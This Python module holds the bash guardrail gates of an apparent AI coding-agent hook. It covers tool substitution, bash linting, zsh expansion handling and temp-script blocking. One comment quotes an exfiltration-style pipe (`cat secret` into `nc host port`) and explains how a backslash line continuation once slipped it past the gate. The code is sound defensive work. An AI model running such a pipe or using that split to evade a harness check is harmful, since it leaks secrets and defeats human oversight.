"""Bash-specific gates -- extracted from context-gate-hook.py (#933).

Gates 5, 6, 7, Q: Tool substitution, bash linting, temp script prevention,
complexity detection.
"""

import re
from pathlib import Path

from .patterns import (
    BASH_LINT_PATTERNS,
    LONG_STRING_THRESHOLD,
    TEMP_SCRIPT_EXTENSIONS,
    TEMP_SCRIPT_PATTERNS,
    TOOL_SUBSTITUTIONS,
    ZSH_EXPANSION_LINT_PATTERNS,
)


def strip_heredocs(command: str) -> str:
    """Strip only heredoc BODIES (not quoted strings) from a command.

    A staged file path is never *defined inside* a heredoc body, so removing
    heredoc bodies is safe before parsing git pathspecs -- and it keeps a
    shlex parser from choking on unbalanced quotes inside code/text bodies.

    Split out of ``strip_heredocs_and_strings`` so ``gates.git_gates`` can
    reuse the heredoc regexes WITHOUT also stripping short quoted paths --
    stripping those would hide a real staged secret path like ``"app/.env"``
    and turn a true positive into a silent miss. Single source of truth for
    the two heredoc regexes.
    """
    # Strip inline heredoc patterns: $(cat <<'EOF' ... EOF)
    result = re.sub(
        r"\$\(cat\s+<<-?'?([\w-]+)'?\s*\n.*?\n\s*\1\s*\)",
        '', command, flags=re.DOTALL
    )
    # Strip heredoc blocks: <<[-]'?DELIM'? ... DELIM
    result = re.sub(
        r"<<-?'?([\w-]+)'?\s*\n.*?\n\s*\1",
        "", result, flags=re.DOTALL
    )
    return result


def strip_heredocs_and_strings(command: str) -> str:
    """Strip heredoc content and quoted strings to avoid false positives.

    Matches like 'find' inside commit messages should not trigger tool substitution.

    Handles:
    - <<EOF ... EOF, <<'EOF' ... EOF, <<-EOF ... \\tEOF (indented)
    - Delimiters with underscores/hyphens (e.g., <<MY_MARKER, <<END-BLOCK)
    - Long double/single-quoted strings (>= LONG_STRING_THRESHOLD chars)
    """
    result = strip_heredocs(command)
    # Strip long double-quoted strings (likely natural language, not commands)
    t = LONG_STRING_THRESHOLD
    result = re.sub(rf'"[^"]{{{t},}}"', '""', result)
    # Strip long single-quoted strings
    result = re.sub(rf"'[^']{{{t},}}'", "''", result)
    return result


# A trailing backslash before a newline is shell LINE CONTINUATION: the two
# lines are one logical command. Joining them before matching keeps the
# command-boundary classes in TOOL_SUBSTITUTIONS honest — without this,
# `cat secret \` + newline + `| nc host port` splits the pipe onto a "different
# line" and slips a real read-into-a-pipe past the gate, while the identical
# one-line command is denied. Found by cross-provider review of #4409.
_LINE_CONTINUATION = re.compile(r"\\\r?\n\s*")


def _join_line_continuations(command: str) -> str:
    """Splice backslash-continued lines into the single command they really are."""
    return _LINE_CONTINUATION.sub(" ", command)


def check_bash_tools(command: str) -> str | None:
    """Gate 5: Check bash commands using wrong tools.

    Returns deny reason string if blocked, None if allowed.
    Context-aware: strips heredoc and long string content before checking.
    """
    if not command:
        return None

    stripped = _join_line_continuations(strip_heredocs_and_strings(command))

    for pattern, (replacement, reason) in TOOL_SUBSTITUTIONS.items():
        if re.search(pattern, stripped):
            # Allow cat piped to data processing commands
            if 'cat' in pattern and re.search(r'\|\s*(?:python3?|jq|sort|uniq|awk|wc|xargs)\b', stripped):
                continue
            return (
                f"[GUARDRAIL: TOOL SUBSTITUTION] {reason}. "
                f"Use {replacement} for better performance and token efficiency."
            )
    return None


# A heredoc whose delimiter is quoted ('EOF', "EOF" or \EOF) is literal text: zsh
# expands nothing in its body. An unquoted <<EOF body IS expanded, so it stays in view.
_QUOTED_HEREDOC_RE = re.compile(
    r"<<-?\s*(?:(['\"])([\w-]+)\1|\\([\w-]+))[^\n]*\n.*?\n\s*(?:\2|\3)\b",
    re.DOTALL,
)


def _unexpanded_span_end(text: str, i: int, in_double: bool) -> int | None:
    """Index just past a span starting at text[i] that zsh never expands, else None.

    Those spans are an escaped character, and -- outside double quotes -- a
    single-quoted string or a comment. An apostrophe inside a comment opens
    nothing, which is why the comment is consumed whole.
    """
    c = text[i]
    if c == "\\":
        return i + 2
    if in_double:
        return None
    if c == "'":
        end = text.find("'", i + 1)
        return len(text) if end == -1 else end + 1
    if c == "#" and (i == 0 or text[i - 1] in " \t\n;&|("):
        end = text.find("\n", i)
        return len(text) if end == -1 else end
    return None


def _expansion_view(command: str) -> str:
    """The command as zsh expands it: everything except what it leaves literal.

    Double-quoted text is KEPT, because zsh expands parameters inside double quotes
    and applies their colon modifiers there too. Each dropped span becomes a space,
    so removing it can never join a `$NAME` to a colon that followed the span.

    Known limit: quoting is not re-tracked inside a `$(...)` that sits within double
    quotes. So `echo "$(printf '%s' '$x:lib/a')"` keeps the single-quoted text and is
    denied, although zsh leaves `$x:lib/a` literal there (checked with `zsh -f`).
    That errs toward denying, and bracing the variable still clears it, so it is
    documented here rather than handled with a parser for substitutions.
    """
    text = _QUOTED_HEREDOC_RE.sub(" ", command)
    out, i, in_double = [], 0, False
    while i < len(text):
        end = _unexpanded_span_end(text, i, in_double)
        if end is not None:
            out.append(" ")
            i = end
            continue
        if text[i] == '"':
            in_double = not in_double
        out.append(text[i])
        i += 1
    return "".join(out)


def check_bash_lint(command: str) -> str | None:
    """Gate 6: Check bash commands for dangerous patterns.

    Takes the RAW command and decides per pattern what it may see: most are matched
    with heredocs and long quoted strings stripped, so prose cannot trip them; the
    zsh colon-modifier patterns are matched against what zsh actually expands.

    Returns deny reason string if blocked, None if allowed.
    """
    if not command:
        return None

    stripped = strip_heredocs_and_strings(command)
    expanded = _expansion_view(command)
    for pattern, reason in BASH_LINT_PATTERNS.items():
        text = expanded if pattern in ZSH_EXPANSION_LINT_PATTERNS else stripped
        if re.search(pattern, text):
            return f"[GUARDRAIL: BASH LINT] {reason}"
    return None


def detect_nested_loops(content: str) -> bool:
    """Gate Q: Fast heuristic for nested loop detection.

    May produce false positives on sequential loops at different indentation
    levels. Acceptable for a soft gate (review signal, not hard block).
    """
    try:
        from gate_heuristics import detect_nested_loops as _detect
        return _detect(content)
    except ImportError:
        return False


def check_temp_script(file_path: str, *, is_autonomous: bool = False,
                      temp_action: str = "deny") -> tuple[str, str] | None:
    """Gate 7: Check for temporary script creation.

    Returns (decision, reason) tuple or None if allowed.
    decision is "deny" or "allow" (with warning message).

    Uses filename stem matching (not full-path substrings) to prevent
    false positives on /tmp/ worktree paths like /tmp/worktree/lib/auth.py.
    """
    if not file_path:
        return None

    path_lower = file_path.lower()

    # Allow permanent infrastructure scripts in ~/.claude/scripts/
    claude_scripts = str(Path.home() / ".claude" / "scripts").lower()
    if path_lower.startswith(claude_scripts):
        return None

    # Check filename stem for temp patterns (NOT full path substrings).
    # This prevents /tmp/worktree/lib/handler.py from false-positive blocking.
    stem = Path(file_path).stem.lower()
    # Delimited-token match (split _ - .), not substring -- else "transcript"/"template" false-positive.
    has_temp_name = bool(set(re.split(r"[_\-.]+", stem)) & {"temp", "tmp", "script"})

    # Also check if in macOS temp directory (always temp regardless of name)
    is_os_temp = "/var/folders/" in path_lower

    if not has_temp_name and not is_os_temp:
        return None

    is_script = any(file_path.endswith(ext) for ext in TEMP_SCRIPT_EXTENSIONS)
    if not is_script:
        return None

    if is_autonomous:
        return None

    if temp_action == "warn":
        return ("allow",
                f"[GUARDRAIL: TEMP SCRIPT] Creating temporary script '{file_path}'. "
                f"Trust level RELAXED -- allowing with warning. Clean up after use.")

    return ("deny",
            f"[GUARDRAIL: TEMP SCRIPT] Creating temporary script '{file_path}'. "
            f"Use MultiEdit for direct changes or execute inline. "
            f"Temp scripts waste 3-8k tokens.")
